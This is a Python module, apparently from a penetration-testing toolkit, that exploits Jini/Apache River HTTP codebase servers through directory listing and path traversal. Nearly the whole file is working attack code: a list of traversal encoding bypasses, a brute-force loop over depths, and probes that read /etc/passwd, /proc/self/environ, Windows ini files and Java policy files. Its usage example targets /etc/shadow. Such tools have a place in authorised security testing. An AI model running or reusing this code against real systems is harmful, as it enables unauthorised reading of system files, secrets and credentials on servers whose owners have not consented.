"""HTTP Codebase Server Exploitation for Jini / Apache River services.

Jini services use an HTTP server to distribute class files (the "codebase").
This HTTP server — typically ``com.sun.jini.tool.ClassServer`` or
``org.apache.river.tool.ClassServer`` — is often vulnerable to:

* **Directory listing** — no index protection, returns file listings.
* **Path traversal** — insufficient path sanitisation allows ``../`` escapes.
* **Arbitrary file reading** — combining traversal with known file paths.

Attack chain:

1. Connect to Jini Lookup Service (port 4160) via Unicast Discovery.
2. Extract codebase URLs from the serialised ServiceRegistrar proxy
   (class annotations contain ``http://<host>:<port>/`` URLs).
3. Probe the HTTP codebase server for traversal and read files.

This is the technique used by pentesters who develop custom Java tools
with ``LookupLocator`` — the codebase HTTP server is the main vector
for filesystem enumeration and arbitrary file reading.
"""

from __future__ import annotations

import re
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from typing import Any

_DEFAULT_TIMEOUT = 5.0

# ---------------------------------------------------------------------------
# Path traversal payloads (various encoding bypasses)
# ---------------------------------------------------------------------------

_TRAVERSAL_ENCODINGS: list[tuple[str, str]] = [
    ("../", "../"),
    ("..%2f", "..%2f"),
    ("..%2F", "..%2F"),
    ("%2e%2e/", "%2e%2e/"),
    ("%2e%2e%2f", "%2e%2e%2f"),
    ("..%252f", "..%252f"),
    ("..%c0%af", "..%c0%af"),
    ("....//", "....//"),
    ("..\\", "..\\"),
    ("..%5c", "..%5c"),
]

# ---------------------------------------------------------------------------
# Known files to probe (by platform)
# ---------------------------------------------------------------------------

_LINUX_PROBE_FILES: list[str] = [
    "etc/passwd",
    "etc/hostname",
    "etc/os-release",
    "etc/issue",
    "etc/resolv.conf",
    "etc/hosts",
    "proc/version",
    "proc/self/environ",
    "proc/self/cmdline",
    "proc/self/status",
    "proc/self/cgroup",
]

_WINDOWS_PROBE_FILES: list[str] = [
    "windows/system32/drivers/etc/hosts",
    "windows/system.ini",
    "windows/win.ini",
]

_JAVA_PROBE_FILES: list[str] = [
    "jre/lib/security/java.policy",
    "jre/lib/security/java.security",
    "conf/security/java.policy",
    "conf/security/java.security",
]

# Codebase-relative paths of interest.
_CODEBASE_PROBE_PATHS: list[str] = [
    "",
    "META-INF/MANIFEST.MF",
    "META-INF/",
    "WEB-INF/web.xml",
    "WEB-INF/",
]


# ---------------------------------------------------------------------------
# Result dataclasses
# ---------------------------------------------------------------------------

@dataclass
class FileReadResult:
    """Result of a single file read attempt through the codebase server."""
    path: str
    success: bool = False
    content: bytes = field(default=b"", repr=False)
    content_text: str = ""
    status_code: int = 0
    technique: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "path": self.path,
            "success": self.success,
            "content_text": self.content_text[:4000],
            "content_length": len(self.content),
            "status_code": self.status_code,
            "technique": self.technique,
        }


@dataclass
class CodebaseExploreResult:
    """Comprehensive result of HTTP codebase server exploitation."""
    base_url: str = ""
    server_header: str = ""
    server_reachable: bool = False
    directory_listing: list[str] = field(default_factory=list)
    traversal_vulnerable: bool = False
    working_traversal: str = ""
    working_depth: int = 0
    readable_files: list[FileReadResult] = field(default_factory=list)
    probed_paths: list[dict[str, Any]] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "base_url": self.base_url,
            "server_header": self.server_header,
            "server_reachable": self.server_reachable,
            "directory_listing": self.directory_listing,
            "traversal_vulnerable": self.traversal_vulnerable,
            "working_traversal": self.working_traversal,
            "working_depth": self.working_depth,
            "readable_files": [f.to_dict() for f in self.readable_files],
            "probed_paths": self.probed_paths,
        }


# ---------------------------------------------------------------------------
# CodebaseExplorer
# ---------------------------------------------------------------------------

class CodebaseExplorer:
    """Exploit Jini HTTP codebase servers for directory listing, path
    traversal, and arbitrary file reading.

    Usage::

        explorer = CodebaseExplorer()
        result = explorer.explore("http://target:8080/")
        for f in result.readable_files:
            print(f.path, f.content_text[:200])

        # Targeted file read
        fr = explorer.read_file("http://target:8080/", "/etc/shadow")
        if fr.success:
            print(fr.content_text)
    """

    def __init__(self, timeout: float = _DEFAULT_TIMEOUT):
        self.timeout = timeout

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def explore(self, base_url: str) -> CodebaseExploreResult:
        """Full exploitation of a codebase HTTP server.

        Steps:
          1. Fingerprint the HTTP server.
          2. Attempt directory listing.
          3. Probe codebase-relative paths.
          4. Test all path traversal encodings.
          5. If traversal works, read interesting system files.
        """
        base_url = self._normalize_url(base_url)
        result = CodebaseExploreResult(base_url=base_url)

        # 1. Fingerprint / reachability
        fp = self._fingerprint(base_url)
        result.server_reachable = fp["reachable"]
        result.server_header = fp.get("server", "")

        if not result.server_reachable:
            return result

        # 2. Directory listing
        result.directory_listing = self._try_directory_listing(base_url)

        # 3. Codebase-relative probes
        for path in _CODEBASE_PROBE_PATHS:
            probe = self._probe_path(base_url, path)
            if probe:
                result.probed_paths.append(probe)

        # 4. Path traversal detection
        traversal = self._test_traversal(base_url)
        if traversal:
            result.traversal_vulnerable = True
            result.working_traversal = traversal["encoding"]
            result.working_depth = traversal["depth"]

            # 5. Read known files through the working traversal
            all_probe_files = _LINUX_PROBE_FILES + _WINDOWS_PROBE_FILES + _JAVA_PROBE_FILES
            for fpath in all_probe_files:
                fr = self._read_file_via_traversal(
                    base_url, fpath,
                    traversal["encoding"], traversal["depth"],
                )
                if fr.success:
                    result.readable_files.append(fr)

        return result

    def read_file(self, base_url: str, file_path: str) -> FileReadResult:
        """Read a specific file through the codebase server.

        Tries direct access first, then every traversal encoding × depth.
        *file_path* should be an absolute path (leading ``/`` is stripped
        automatically) or a relative path from the filesystem root.
        """
        base_url = self._normalize_url(base_url)
        clean = file_path.lstrip("/")

        # Direct access
        res = self._fetch(base_url + clean)
        if res["success"] and self._looks_like_content(res["body"], clean):
            return FileReadResult(
                path=file_path, success=True,
                content=res["body"],
                content_text=res["body"].decode("utf-8", errors="replace"),
                status_code=res["status"],
                technique="direct",
            )

        # Traversal attempts
        for _label, encoding in _TRAVERSAL_ENCODINGS:
            for depth in range(1, 13):
                traversal = encoding * depth
                url = base_url + traversal + clean
                res = self._fetch(url)
                if res["success"] and self._looks_like_content(res["body"], clean):
                    return FileReadResult(
                        path=file_path, success=True,
                        content=res["body"],
                        content_text=res["body"].decode("utf-8", errors="replace"),
                        status_code=res["status"],
                        technique=f"traversal:{encoding}*{depth}",
                    )

        return FileReadResult(path=file_path)

    def list_directory(self, base_url: str, path: str = "") -> list[str]:
        """Attempt to list a directory on the codebase server."""
        base_url = self._normalize_url(base_url)
        return self._try_directory_listing(base_url + path.lstrip("/"))

    # ------------------------------------------------------------------
    # Internal methods
    # ------------------------------------------------------------------

    @staticmethod
    def _normalize_url(url: str) -> str:
        if not url.endswith("/"):
            url += "/"
        return url

    def _fingerprint(self, base_url: str) -> dict[str, Any]:
        try:
            req = urllib.request.Request(base_url, method="GET")
            req.add_header("User-Agent", "Java/1.8.0_191")
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            server = resp.headers.get("Server", "")
            return {"reachable": True, "server": server, "status": resp.status}
        except urllib.error.HTTPError as exc:
            server = exc.headers.get("Server", "") if exc.headers else ""
            return {"reachable": True, "server": server, "status": exc.code}
        except Exception:
            return {"reachable": False, "server": "", "status": 0}

    def _try_directory_listing(self, url: str) -> list[str]:
        entries: list[str] = []
        try:
            req = urllib.request.Request(url, method="GET")
            req.add_header("User-Agent", "Java/1.8.0_191")
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            body = resp.read(65536).decode("utf-8", errors="replace")

            # HTML directory index
            links = re.findall(r'href=["\']([^"\']+)["\']', body, re.IGNORECASE)
            for link in links:
                if link.startswith(("http://", "https://", "#", "?")):
                    continue
                if link in ("../", "/"):
                    continue
                entries.append(link)

            # Plain-text listing (some ClassServer versions)
            if not entries:
                for line in body.splitlines():
                    line = line.strip()
                    if line and not line.startswith("<") and not line.startswith("HTTP"):
                        entries.append(line)
        except Exception:
            pass
        return entries

    def _probe_path(self, base_url: str, path: str) -> dict[str, Any] | None:
        url = base_url + path
        res = self._fetch(url)
        if res["success"]:
            return {
                "path": path or "/",
                "status": res["status"],
                "content_length": len(res["body"]),
                "content_snippet": res["body"][:300].decode("utf-8", errors="replace"),
            }
        return None

    def _test_traversal(self, base_url: str) -> dict[str, Any] | None:
        """Test all encoding × depth combos against known canary files."""
        canaries = [
            ("etc/passwd", b"root:"),
            ("etc/hostname", None),
            ("windows/win.ini", b"[fonts]"),
        ]

        for canary_path, canary_sig in canaries:
            for _label, encoding in _TRAVERSAL_ENCODINGS:
                for depth in range(1, 13):
                    traversal = encoding * depth
                    url = base_url + traversal + canary_path
                    res = self._fetch(url)
                    if res["success"] and res["body"]:
                        if canary_sig is None or canary_sig in res["body"]:
                            return {
                                "encoding": encoding,
                                "depth": depth,
                                "canary": canary_path,
                            }
        return None

    def _read_file_via_traversal(
        self, base_url: str, file_path: str,
        encoding: str, depth: int,
    ) -> FileReadResult:
        traversal = encoding * depth
        url = base_url + traversal + file_path
        res = self._fetch(url)
        if res["success"] and res["body"]:
            return FileReadResult(
                path=file_path, success=True,
                content=res["body"],
                content_text=res["body"].decode("utf-8", errors="replace"),
                status_code=res["status"],
                technique=f"traversal:{encoding}*{depth}",
            )
        return FileReadResult(path=file_path)

    def _fetch(self, url: str) -> dict[str, Any]:
        try:
            req = urllib.request.Request(url, method="GET")
            req.add_header("User-Agent", "Java/1.8.0_191")
            resp = urllib.request.urlopen(req, timeout=self.timeout)
            body = resp.read(1_048_576)
            return {"success": True, "status": resp.status, "body": body}
        except urllib.error.HTTPError as exc:
            try:
                body = exc.read(1_048_576)
            except Exception:
                body = b""
            return {"success": False, "status": exc.code, "body": body}
        except Exception:
            return {"success": False, "status": 0, "body": b""}

    @staticmethod
    def _looks_like_content(body: bytes, path: str) -> bool:
        """Heuristic: does *body* look like actual file content?"""
        if not body:
            return False
        lower = path.lower()
        if lower.endswith("passwd"):
            return b"root:" in body or b"nobody:" in body
        if lower.endswith("hosts"):
            return b"localhost" in body
        if lower.endswith("hostname"):
            return len(body) < 256 and body.strip().isascii()
        if lower.endswith("win.ini"):
            return b"[fonts]" in body or b"[extensions]" in body
        if lower.endswith((".xml", ".policy")):
            return b"<" in body or b"grant" in body
        if lower.endswith("os-release"):
            return b"NAME=" in body or b"ID=" in body
        if lower.endswith("version"):
            return b"Linux" in body or b"version" in body
        if lower.endswith(("environ", "cmdline")):
            # These contain NUL-separated or no-newline content
            return len(body) > 4
        if lower.endswith("resolv.conf"):
            return b"nameserver" in body or b"search" in body
        if lower.endswith("issue"):
            return len(body) < 1024 and body.strip().isascii()
        if lower.endswith("status"):
            return b"Name:" in body or b"Pid:" in body
        if lower.endswith(("java.security", "java.policy")):
            return b"grant" in body or b"security" in body or b"keystore" in body
        if lower.endswith("MANIFEST.MF"):
            return b"Manifest-Version" in body
        # Generic: at least 70% printable ASCII
        sample = body[:512]
        printable = sum(1 for b in sample if 32 <= b < 127 or b in (9, 10, 13))
        return len(sample) > 0 and printable > len(sample) * 0.7
